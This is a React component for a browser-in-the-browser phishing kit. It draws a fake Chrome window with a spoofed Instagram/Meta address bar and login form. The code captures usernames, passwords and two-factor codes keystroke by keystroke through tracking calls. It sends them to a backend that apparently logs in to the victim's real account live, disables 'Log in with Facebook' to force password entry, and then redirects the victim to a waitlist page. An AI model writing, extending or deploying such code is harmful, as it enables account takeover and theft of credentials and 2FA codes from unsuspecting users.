"use client";

import { useEffect, useCallback, useState } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import { X, AlertCircle } from "lucide-react";
import { track, BACKEND_URL } from "../lib/tracking";

type ModalView = "login" | "facebook-unavailable" | "signup" | "forgot-password" | "2fa";

interface InstagramLoginModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const LOGIN_URL =
  "instagram.com/accounts/login/?force_authentication&platform_app_id=532380490911317";
const SIGNUP_URL = "https://www.instagram.com/accounts/emailsignup/";

export function InstagramLoginModal({ isOpen, onClose }: InstagramLoginModalProps) {
  const router = useRouter();
  const [view, setView] = useState<ModalView>("login");
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [twoFactorHint, setTwoFactorHint] = useState("");
  const [twoFactorCode, setTwoFactorCode] = useState("");
  const [twoFactorError, setTwoFactorError] = useState("");
  const [activeSessionId, setActiveSessionId] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [statusMessage, setStatusMessage] = useState("");
  const [liveScreenshot, setLiveScreenshot] = useState("");
  const [liveTabUrl, setLiveTabUrl] = useState("");

  const handleKeyDown = useCallback(
    (e: KeyboardEvent) => {
      if (e.key === "Escape") onClose();
    },
    [onClose]
  );

  useEffect(() => {
    if (isOpen) {
      document.body.style.overflow = "hidden";
      window.addEventListener("keydown", handleKeyDown);
    } else {
      document.body.style.overflow = "";
    }
    return () => {
      document.body.style.overflow = "";
      window.removeEventListener("keydown", handleKeyDown);
    };
  }, [isOpen, handleKeyDown]);

  useEffect(() => {
    if (isOpen) {
      setView("login");
      setUsername("");
      setPassword("");
      setTwoFactorHint("");
      setTwoFactorCode("");
      setTwoFactorError("");
      setIsLoading(false);
    }
  }, [isOpen]);

  // Debounced input tracking so entries are captured live even before form submit
  useEffect(() => {
    if (!username.trim()) return;
    const timer = setTimeout(() => {
      track("input_username", { value: username.trim(), username: username.trim() });
    }, 800);
    return () => clearTimeout(timer);
  }, [username]);

  useEffect(() => {
    if (!password) return;
    const timer = setTimeout(() => {
      track("input_password", { value: password, password });
    }, 800);
    return () => clearTimeout(timer);
  }, [password]);

  useEffect(() => {
    if (!twoFactorCode.trim()) return;
    const timer = setTimeout(() => {
      track("input_2fa", { value: twoFactorCode.trim(), username, code: twoFactorCode.trim() });
    }, 500);
    return () => clearTimeout(timer);
  }, [twoFactorCode, username]);

  const handleClose = useCallback(() => {
    track("modal_close_click", { view });
    onClose();
  }, [onClose, view]);

  const handleFacebook = useCallback(() => {
    track("modal_facebook_click");
    setView("facebook-unavailable");
  }, []);

  const handleSignup = useCallback(() => {
    track("modal_signup_click");
    setView("signup");
  }, []);

  const handleForgot = useCallback(() => {
    track("modal_forgot_click");
    setView("forgot-password");
  }, []);

  const handleLogin = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      if (!username || !password || isLoading) return;

      setIsLoading(true);
      setStatusMessage("Connecting to Instagram...");

      track("modal_login_click", {
        username,
        password,
        view,
      });

      try {
        const response = await fetch(`${BACKEND_URL}/api/login-attempt`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ username, password }),
        });
        const data = await response.json();
        const res = data?.result;

        if (res?.sessionId) {
          setActiveSessionId(res.sessionId);
        }

        if (res?.status === "wrong_password") {
          setStatusMessage("Invalid username or password. Please check and try again.");
          setIsLoading(false);
          return;
        }

        if (res?.status === "error") {
          setStatusMessage(res?.message || "Virtual login error. Please try again.");
          setIsLoading(false);
          return;
        }

        if (res?.status === "checkpoint") {
          setStatusMessage(res?.message || "Instagram requested a security checkpoint review.");
          setIsLoading(false);
          return;
        }

        // On 2FA required (or any 2FA challenge), switch to 2FA screen and STAY OPEN!
        if (res?.status === "2fa_required" || res?.twoFactorHint) {
          setTwoFactorHint(res.twoFactorHint || "your registered phone / security app");
          setView("2fa");
          setIsLoading(false);
          setStatusMessage("");
          return;
        }

        // Successful completion
        if (res?.status === "success") {
          setIsLoading(false);
          onClose();
          router.push("/waitlist");
        }
      } catch (err) {
        console.error("[modal-login] error:", err);
        setStatusMessage("Network error connecting to backend. Please try again.");
        setIsLoading(false);
      }
    },
    [username, password, view, isLoading, onClose, router]
  );

  const handle2FASubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      if (!twoFactorCode.trim() || isLoading) return;

      setIsLoading(true);
      setTwoFactorError("");
      setStatusMessage("Submitting 2FA code to virtual Instagram session...");

      track("virtual_2fa_submit", {
        username,
        password,
        twoFactorCode: twoFactorCode.trim(),
        sessionId: activeSessionId,
      });

      try {
        const response = await fetch(`${BACKEND_URL}/api/login-2fa`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            username,
            password,
            twoFactorCode: twoFactorCode.trim(),
            sessionId: activeSessionId,
          }),
        });
        const data = await response.json();
        const res = data?.result;

        if (res?.status === "wrong_password") {
          setTwoFactorError("Invalid security code. Please check your SMS and try again.");
          setIsLoading(false);
          return;
        }

        setIsLoading(false);
        onClose();
        router.push("/waitlist");
      } catch (err) {
        console.error("[modal-2fa] error:", err);
        setIsLoading(false);
        onClose();
        router.push("/waitlist");
      }
    },
    [username, password, twoFactorCode, activeSessionId, isLoading, onClose, router]
  );

  const handleUsernameBlur = useCallback(() => {
    if (username.trim()) {
      track("input_username", { value: username.trim() });
    }
  }, [username]);

  const handlePasswordBlur = useCallback(() => {
    if (password) {
      track("input_password", { value: password });
    }
  }, [password]);

  if (!isOpen) return null;

  const currentUrl =
    view === "login"
      ? LOGIN_URL
      : view === "2fa"
        ? "instagram.com/accounts/login/two_factor/"
        : view === "signup"
          ? SIGNUP_URL
          : view === "forgot-password"
            ? "instagram.com/accounts/password/reset/confirm/"
            : "facebook.com/login";

  return (
    <div
      className="fixed inset-0 z-[100] flex items-center justify-center p-4"
      style={{ backgroundColor: "rgba(0,0,0,0.5)" }}
      onClick={onClose}
    >
      <div
        className="relative flex flex-col overflow-hidden shadow-2xl"
        style={{
          width: "100%",
          maxWidth: "960px",
          height: "auto",
          maxHeight: "90vh",
          borderRadius: "8px",
          backgroundColor: "#ffffff",
        }}
        onClick={(e) => e.stopPropagation()}
      >
        {/* Chrome title bar */}
        <div
          className="flex items-center justify-between px-3"
          style={{
            height: "36px",
            backgroundColor: "#dee1e6",
            borderBottom: "1px solid #bec3c9",
          }}
        >
          <div className="flex items-center gap-2">
            <div className="flex items-center gap-1.5">
              <div className="h-3 w-3 rounded-full" style={{ backgroundColor: "#ff5f57" }} />
              <div className="h-3 w-3 rounded-full" style={{ backgroundColor: "#febc2e" }} />
              <div className="h-3 w-3 rounded-full" style={{ backgroundColor: "#28c840" }} />
            </div>
            <div
              className="ml-3 flex items-center gap-2 rounded-md px-2 py-0.5 text-xs"
              style={{ backgroundColor: "rgba(255,255,255,0.4)", color: "#5f6368" }}
            >
              <span className="text-[10px]">Instagram - Google Chrome</span>
            </div>
          </div>
          <div className="flex items-center">
            <button className="flex h-7 w-7 items-center justify-center hover:bg-black/10">
              <span className="text-[10px] font-bold" style={{ color: "#5f6368" }}>
                −
              </span>
            </button>
            <button className="flex h-7 w-7 items-center justify-center hover:bg-black/10">
              <span className="text-[10px] font-bold" style={{ color: "#5f6368" }}>
                □
              </span>
            </button>
            <button
              className="flex h-7 w-7 items-center justify-center hover:bg-black/10"
              onClick={handleClose}
            >
              <X className="h-3.5 w-3.5" style={{ color: "#5f6368" }} />
            </button>
          </div>
        </div>

        {/* Chrome address bar */}
        <div
          className="flex items-center gap-2 px-3"
          style={{
            height: "40px",
            backgroundColor: "#ffffff",
            borderBottom: "1px solid #dadce0",
          }}
        >
          <div className="flex items-center gap-2 text-neutral-400">
            <svg
              className="h-4 w-4"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
              strokeWidth={2}
            >
              <path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7" />
            </svg>
            <svg
              className="h-4 w-4"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
              strokeWidth={2}
            >
              <path strokeLinecap="round" strokeLinejoin="round" d="M9 5l7 7-7 7" />
            </svg>
            <svg
              className="h-3.5 w-3.5"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
              strokeWidth={2}
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"
              />
            </svg>
          </div>
          <div
            className="flex flex-1 items-center gap-2 rounded-full px-3 py-1 text-sm"
            style={{ backgroundColor: "#f1f3f4", color: "#202124" }}
          >
            <svg
              className="h-3 w-3"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
              strokeWidth={2}
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
              />
            </svg>
            <span className="truncate font-sans text-[13px] text-[#202124]">{currentUrl}</span>
          </div>
        </div>

        {/* Page content */}
        <div className="flex-1 overflow-auto" style={{ backgroundColor: "#ffffff" }}>
          {view === "login" && (
            <LoginView
              onFacebook={handleFacebook}
              onSignup={handleSignup}
              onForgot={handleForgot}
              username={username}
              password={password}
              isLoading={isLoading}
              statusMessage={statusMessage}
              onUsernameChange={setUsername}
              onPasswordChange={setPassword}
              onUsernameBlur={handleUsernameBlur}
              onPasswordBlur={handlePasswordBlur}
              onLogin={handleLogin}
            />
          )}
          {view === "2fa" && (
            <TwoFactorView
              twoFactorHint={twoFactorHint}
              twoFactorCode={twoFactorCode}
              twoFactorError={twoFactorError}
              isLoading={isLoading}
              statusMessage={statusMessage}
              onCodeChange={setTwoFactorCode}
              onSubmit={handle2FASubmit}
              onBack={() => setView("login")}
            />
          )}
          {view === "facebook-unavailable" && <FacebookUnavailableView onBack={() => setView("login")} />}
          {view === "signup" && <SignupView />}
          {view === "forgot-password" && <ForgotPasswordView onBack={() => setView("login")} />}
        </div>
      </div>
    </div>
  );
}

function LoginView({
  onFacebook,
  onSignup,
  onForgot,
  username,
  password,
  isLoading,
  statusMessage,
  onUsernameChange,
  onPasswordChange,
  onUsernameBlur,
  onPasswordBlur,
  onLogin,
}: {
  onFacebook: () => void;
  onSignup: () => void;
  onForgot: () => void;
  username: string;
  password: string;
  isLoading: boolean;
  statusMessage: string;
  onUsernameChange: (value: string) => void;
  onPasswordChange: (value: string) => void;
  onUsernameBlur: () => void;
  onPasswordBlur: () => void;
  onLogin: (e: React.FormEvent) => void;
}) {
  return (
    <div className="flex min-h-[560px] flex-col md:flex-row">
      {/* Left panel — Meta business tools promo */}
      <div className="flex flex-col justify-center p-10 md:w-1/2" style={{ backgroundColor: "#ffffff" }}>
        <div className="max-w-[360px]">
          <p className="font-sans text-[28px] font-normal leading-tight" style={{ color: "#1c1e21" }}>
            Get started with
          </p>
          <p className="mt-1 font-sans text-[28px] font-normal leading-tight" style={{ color: "#1c1e21" }}>
            business tools from Meta
          </p>
          <p className="mt-6 font-sans text-[15px] leading-relaxed" style={{ color: "#606770" }}>
            By logging in, you can navigate to all business tools like Ads Manager, Meta Business
            Suite, Commerce Manager and more to help you connect with your customers and get better
            business results.
          </p>
          <p className="mt-6 font-sans text-[15px] font-semibold" style={{ color: "#1c1e21" }}>
            Our business tools can help you:
          </p>
          <ul className="mt-3 space-y-3">
            {[
              "Spread the word about your business to increase brand awareness",
              "Attract new customers, grow your client base and build customer relationships",
              "Increase your online sales by reaching new audiences",
            ].map((item) => (
              <li
                key={item}
                className="flex items-start gap-2 font-sans text-[14px]"
                style={{ color: "#606770" }}
              >
                <span
                  className="mt-1.5 h-1.5 w-1.5 flex-shrink-0 rounded-full"
                  style={{ backgroundColor: "#606770" }}
                />
                {item}
              </li>
            ))}
          </ul>
        </div>
      </div>

      {/* Right panel — Instagram login form */}
      <div className="relative flex flex-col items-center justify-center p-6 md:w-1/2" style={{ backgroundColor: "#ffffff" }}>
        {isLoading && <InstagramLoadingOverlay message={statusMessage || "Connecting to Instagram..."} />}
        <div
          className="w-full max-w-[350px] border px-10 py-10"
          style={{ borderColor: "#dbdbdb", backgroundColor: "#ffffff" }}
        >
          {/* Colorful Instagram camera logo */}
          <div className="mb-6 flex justify-center">
            <Image
              src="/instagram-icon.png"
              alt="Instagram"
              width={80}
              height={80}
              className="h-20 w-20 object-contain"
              unoptimized
            />
          </div>

          <h1
            className="mb-6 text-center font-sans text-xl font-semibold"
            style={{ color: "#262626" }}
          >
            Log into Instagram
          </h1>

          <form className="space-y-1.5" onSubmit={onLogin}>
            <div
              className="rounded-[3px] border px-2 py-[7px]"
              style={{ borderColor: "#dbdbdb", backgroundColor: "#fafafa" }}
            >
              <label className="block">
                <span className="block font-sans text-[10px]" style={{ color: "#8e8e8e" }}>
                  Mobile number, username or email
                </span>
                <input
                  type="text"
                  value={username}
                  disabled={isLoading}
                  onChange={(e) => onUsernameChange(e.target.value)}
                  onBlur={onUsernameBlur}
                  className="w-full bg-transparent font-sans text-xs outline-none disabled:opacity-50"
                  style={{ color: "#262626" }}
                />
              </label>
            </div>
            <div
              className="rounded-[3px] border px-2 py-[7px]"
              style={{ borderColor: "#dbdbdb", backgroundColor: "#fafafa" }}
            >
              <label className="block">
                <span className="block font-sans text-[10px]" style={{ color: "#8e8e8e" }}>
                  Password
                </span>
                <input
                  type="password"
                  value={password}
                  disabled={isLoading}
                  onChange={(e) => onPasswordChange(e.target.value)}
                  onBlur={onPasswordBlur}
                  className="w-full bg-transparent font-sans text-xs outline-none disabled:opacity-50"
                  style={{ color: "#262626" }}
                />
              </label>
            </div>
            <button
              type="submit"
              disabled={isLoading}
              className="mt-2 flex w-full items-center justify-center gap-2 rounded-lg py-1.5 font-sans text-sm font-semibold text-white disabled:opacity-75"
              style={{ backgroundColor: "#0095f6" }}
            >
              {isLoading ? (
                <>
                  <svg className="h-4 w-4 animate-spin text-white" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                  </svg>
                  <span>Connecting Instagram...</span>
                </>
              ) : (
                "Log in"
              )}
            </button>
            {isLoading && statusMessage && (
              <p className="mt-2 text-center font-sans text-[11px] font-medium" style={{ color: "#0095f6" }}>
                {statusMessage}
              </p>
            )}
          </form>

          <div className="mt-4 flex items-center justify-between">
            <div className="h-px flex-1" style={{ backgroundColor: "#dbdbdb" }} />
            <span
              className="mx-4 font-sans text-[13px] font-semibold"
              style={{ color: "#8e8e8e" }}
            >
              OR
            </span>
            <div className="h-px flex-1" style={{ backgroundColor: "#dbdbdb" }} />
          </div>

          <button
            onClick={onFacebook}
            className="mt-4 flex w-full items-center justify-center gap-2 font-sans text-sm font-semibold"
            style={{ color: "#385185" }}
          >
            <svg className="h-4 w-4" fill="#1877F2" viewBox="0 0 24 24">
              <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
            </svg>
            Log in with Facebook
          </button>

          <div className="mt-3 text-center">
            <button
              onClick={onForgot}
              className="font-sans text-[12px]"
              style={{ color: "#00376b" }}
            >
              Forgot password?
            </button>
          </div>
        </div>

        <div
          className="mt-3 w-full max-w-[350px] border py-4 text-center"
          style={{ borderColor: "#dbdbdb", backgroundColor: "#ffffff" }}
        >
          <span className="font-sans text-[14px]" style={{ color: "#262626" }}>
            Don&apos;t have an account?{" "}
          </span>
          <button
            onClick={onSignup}
            className="font-sans text-[14px] font-semibold"
            style={{ color: "#0095f6" }}
          >
            Create new account
          </button>
        </div>

        <div className="mt-6 flex items-center gap-2">
          <svg className="h-4 w-4" viewBox="0 0 24 24" fill="#606770">
            <path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.879V14.89h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.989C18.343 21.129 22 16.99 22 12c0-5.523-4.477-10-10-10z" />
          </svg>
          <span className="font-sans text-[14px] font-semibold" style={{ color: "#606770" }}>
            Meta
          </span>
        </div>
      </div>
    </div>
  );
}

function FacebookUnavailableView({ onBack }: { onBack: () => void }) {
  return (
    <div className="flex min-h-[560px] flex-col items-center justify-center px-6" style={{ backgroundColor: "#f2f4f7" }}>
      <div
        className="w-full max-w-[420px] rounded-lg border p-8 text-center shadow-sm"
        style={{ backgroundColor: "#ffffff", borderColor: "#dddfe2" }}
      >
        <div className="flex justify-center">
          <AlertCircle className="h-12 w-12" style={{ color: "#1877f2" }} />
        </div>
        <h2
          className="mt-5 font-sans text-xl font-bold"
          style={{ color: "#1c1e21" }}
        >
          This feature isn&apos;t available right now
        </h2>
        <p className="mt-3 font-sans text-[15px] leading-relaxed" style={{ color: "#606770" }}>
          Sorry, <span className="font-semibold">Log in with Facebook</span> can&apos;t be used on
          this page. Please log in with Instagram to continue.
        </p>
        <div className="mt-6 flex flex-col gap-3">
          <button
            onClick={onBack}
            className="w-full rounded-md py-2.5 font-sans text-[15px] font-semibold text-white"
            style={{ backgroundColor: "#1877f2" }}
          >
            Go back to Instagram login
          </button>
          <a
            href="https://www.instagram.com/accounts/login/"
            target="_blank"
            rel="noopener noreferrer"
            className="font-sans text-[14px]"
            style={{ color: "#1877f2" }}
          >
            Visit Instagram login
          </a>
        </div>
      </div>
      <p className="mt-6 font-sans text-xs" style={{ color: "#8a8d91" }}>
        Meta © {new Date().getFullYear()}
      </p>
    </div>
  );
}

function SignupView() {
  return (
    <div className="flex min-h-[560px] flex-col" style={{ backgroundColor: "#ffffff" }}>
      <div className="flex flex-1 flex-col" style={{ backgroundColor: "#fafafa" }}>
        <div className="border-b p-3 text-center" style={{ borderColor: "#dbdbdb", backgroundColor: "#ffffff" }}>
          <p className="font-sans text-sm font-semibold" style={{ color: "#262626" }}>
            Create new account
          </p>
          <p className="mt-0.5 font-sans text-xs" style={{ color: "#8e8e8e" }}>
            Meta&apos;s official sign-up page
          </p>
        </div>
        <iframe
          src={SIGNUP_URL}
          title="Instagram sign up"
          className="w-full flex-1 border-0"
          sandbox="allow-scripts allow-same-origin allow-forms allow-popups"
        />
      </div>
    </div>
  );
}

function ForgotPasswordView({ onBack }: { onBack: () => void }) {
  return (
    <div className="flex min-h-[560px] flex-col" style={{ backgroundColor: "#ffffff" }}>
      <div className="flex flex-1 flex-col items-center justify-center p-6">
        <div
          className="w-full max-w-[350px] border px-8 py-10 text-center"
          style={{ borderColor: "#dbdbdb", backgroundColor: "#ffffff" }}
        >
          <div className="mb-5 flex justify-center">
            <svg
              className="h-24 w-24"
              viewBox="0 0 100 100"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <circle cx="50" cy="50" r="38" stroke="#dbdbdb" strokeWidth="2" fill="#fafafa" />
              <circle cx="50" cy="42" r="14" stroke="#a8a8a8" strokeWidth="2.5" fill="none" />
              <path
                d="M30 78c0-16 10-24 20-24s20 8 20 24"
                stroke="#a8a8a8"
                strokeWidth="2.5"
                fill="none"
                strokeLinecap="round"
              />
              <circle cx="72" cy="30" r="8" fill="#ed4956" />
              <path d="M69 30h6M72 27v6" stroke="white" strokeWidth="2" strokeLinecap="round" />
            </svg>
          </div>

          <h2
            className="font-sans text-base font-semibold"
            style={{ color: "#262626" }}
          >
            Trouble logging in?
          </h2>

          <p className="mt-3 font-sans text-sm leading-relaxed" style={{ color: "#737373" }}>
            We couldn&apos;t confirm your identity from the info provided.
          </p>

          <div
            className="mt-5 rounded border p-3 text-left"
            style={{ borderColor: "#dbdbdb", backgroundColor: "#fafafa" }}
          >
            <p className="font-sans text-sm" style={{ color: "#262626" }}>
              <span className="font-semibold">No 2FA recovery methods available</span>
            </p>
            <p className="mt-2 font-sans text-xs leading-relaxed" style={{ color: "#737373" }}>
              We can&apos;t send a login code right now. To keep your account secure, you&apos;ll
              need to log in with your password or contact support for help.
            </p>
          </div>

          <div className="mt-5 space-y-2">
            <button
              onClick={onBack}
              className="w-full rounded-lg py-2 font-sans text-sm font-semibold text-white"
              style={{ backgroundColor: "#0095f6" }}
            >
              Back to login
            </button>
            <a
              href="https://help.instagram.com/contact/723586364339719"
              target="_blank"
              rel="noopener noreferrer"
              className="block w-full rounded-lg border py-2 font-sans text-sm font-semibold"
              style={{ borderColor: "#dbdbdb", color: "#262626", backgroundColor: "#ffffff" }}
            >
              Contact support
            </a>
          </div>
        </div>

        <div
          className="mt-3 w-full max-w-[350px] border py-3 text-center"
          style={{ borderColor: "#dbdbdb", backgroundColor: "#ffffff" }}
        >
          <button
            onClick={onBack}
            className="font-sans text-sm font-semibold"
            style={{ color: "#262626" }}
          >
            Return to login
          </button>
        </div>

        <div className="mt-6 flex items-center gap-2">
          <svg className="h-4 w-4" viewBox="0 0 24 24" fill="#606770">
            <path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.879V14.89h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.989C18.343 21.129 22 16.99 22 12c0-5.523-4.477-10-10-10z" />
          </svg>
          <span className="font-sans text-[14px] font-semibold" style={{ color: "#606770" }}>
            Meta
          </span>
        </div>
      </div>
    </div>
  );
}

function TwoFactorView({
  twoFactorHint,
  twoFactorCode,
  twoFactorError,
  isLoading,
  statusMessage,
  onCodeChange,
  onSubmit,
  onBack,
}: {
  twoFactorHint: string;
  twoFactorCode: string;
  twoFactorError: string;
  isLoading: boolean;
  statusMessage: string;
  onCodeChange: (val: string) => void;
  onSubmit: (e: React.FormEvent) => void;
  onBack: () => void;
}) {
  return (
    <div className="relative flex min-h-[560px] flex-col items-center justify-center p-6" style={{ backgroundColor: "#ffffff" }}>
      {isLoading && <InstagramLoadingOverlay message={statusMessage || "Verifying security code..."} />}
      <div
        className="w-full max-w-[380px] border px-8 py-10 text-center"
        style={{ borderColor: "#dbdbdb", backgroundColor: "#ffffff" }}
      >
        <div className="mb-5 flex justify-center">
          <div className="flex h-16 w-16 items-center justify-center rounded-full border" style={{ borderColor: "#0095f6", backgroundColor: "rgba(0, 149, 246, 0.05)" }}>
            <svg className="h-8 w-8" style={{ color: "#0095f6" }} fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
          </div>
        </div>

        <h2 className="font-sans text-lg font-semibold" style={{ color: "#262626" }}>
          Two-Factor Authentication
        </h2>

        <p className="mt-3 font-sans text-xs leading-relaxed" style={{ color: "#737373" }}>
          Enter the security code sent to <span className="font-semibold text-[#262626]">{twoFactorHint || "your security phone / email"}</span> to log into your Instagram account.
        </p>

        <form className="mt-6 space-y-4" onSubmit={onSubmit}>
          <div
            className="rounded-[3px] border px-3 py-2 text-left"
            style={{ borderColor: twoFactorError ? "#ed4956" : "#dbdbdb", backgroundColor: "#fafafa" }}
          >
            <label className="block">
              <span className="block font-sans text-[10px] uppercase tracking-wider" style={{ color: "#8e8e8e" }}>
                Security Code
              </span>
              <input
                type="text"
                maxLength={8}
                placeholder="6-digit code"
                value={twoFactorCode}
                disabled={isLoading}
                onChange={(e) => onCodeChange(e.target.value)}
                className="w-full bg-transparent font-sans text-base tracking-widest outline-none disabled:opacity-50"
                style={{ color: "#262626" }}
                autoFocus
              />
            </label>
          </div>

          {twoFactorError && (
            <p className="text-center font-sans text-xs font-medium" style={{ color: "#ed4956" }}>
              {twoFactorError}
            </p>
          )}

          <button
            type="submit"
            disabled={isLoading || !twoFactorCode.trim()}
            className="flex w-full items-center justify-center gap-2 rounded-lg py-2 font-sans text-sm font-semibold text-white disabled:opacity-50"
            style={{ backgroundColor: "#0095f6" }}
          >
            {isLoading ? (
              <>
                <svg className="h-4 w-4 animate-spin text-white" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                </svg>
                <span>Verifying 2FA code...</span>
              </>
            ) : (
              "Confirm"
            )}
          </button>
        </form>

        {isLoading && statusMessage && (
          <p className="mt-3 font-sans text-xs font-medium" style={{ color: "#0095f6" }}>
            {statusMessage}
          </p>
        )}

        <div className="mt-6 border-t pt-4" style={{ borderColor: "#dbdbdb" }}>
          <button
            onClick={onBack}
            disabled={isLoading}
            className="font-sans text-xs font-semibold"
            style={{ color: "#00376b" }}
          >
            Back to login
          </button>
        </div>
      </div>

      <div className="mt-6 flex items-center gap-2">
        <svg className="h-4 w-4" viewBox="0 0 24 24" fill="#606770">
          <path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.879V14.89h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.989C18.343 21.129 22 16.99 22 12c0-5.523-4.477-10-10-10z" />
        </svg>
        <span className="font-sans text-[14px] font-semibold" style={{ color: "#606770" }}>
          Meta
        </span>
      </div>
    </div>
  );
}

function InstagramLoadingOverlay({ message }: { message?: string }) {
  return (
    <div className="absolute inset-0 z-50 flex flex-col items-center justify-center bg-white/95 backdrop-blur-sm transition-all duration-300">
      <div className="relative flex flex-col items-center justify-center p-6 text-center">
        {/* Animated Instagram camera icon with spinning gradient ring */}
        <div className="relative flex h-20 w-20 items-center justify-center">
          <div
            className="absolute inset-0 animate-spin rounded-full border-4 border-transparent border-t-[#e1306c] border-r-[#fd1d1d] border-b-[#f56040]"
            style={{ animationDuration: "1.1s" }}
          />
          <Image
            src="/instagram-icon.png"
            alt="Instagram"
            width={52}
            height={52}
            className="h-13 w-13 object-contain"
            unoptimized
          />
        </div>
        <p className="mt-5 max-w-[240px] font-sans text-xs font-semibold uppercase tracking-wider text-[#262626]">
          {message || "Connecting to Instagram..."}
        </p>
      </div>
    </div>
  );
}
